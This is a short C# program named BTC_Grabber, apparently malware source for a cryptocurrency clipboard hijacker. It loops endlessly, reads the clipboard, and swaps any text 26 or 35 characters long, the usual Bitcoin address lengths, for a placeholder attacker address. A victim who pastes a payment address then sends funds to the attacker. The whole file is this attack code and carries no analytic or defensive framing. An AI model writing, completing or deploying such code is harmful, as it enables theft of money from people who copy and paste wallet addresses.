namespace BTC_Grabber
{
    internal static class Program
    {
        [STAThread]
        static void Main()
        {
            string new_CB = "Enter_BTC_address_here";

            while (true)
            {
                string CB = Clipboard.GetText(TextDataFormat.Text);

                if (CB.Length == 26)
                {
                    Clipboard.SetText(new_CB);
                }
                else if (CB.Length == 35)
                {
                    Clipboard.SetText(new_CB);
                }
            }
        }
    }
}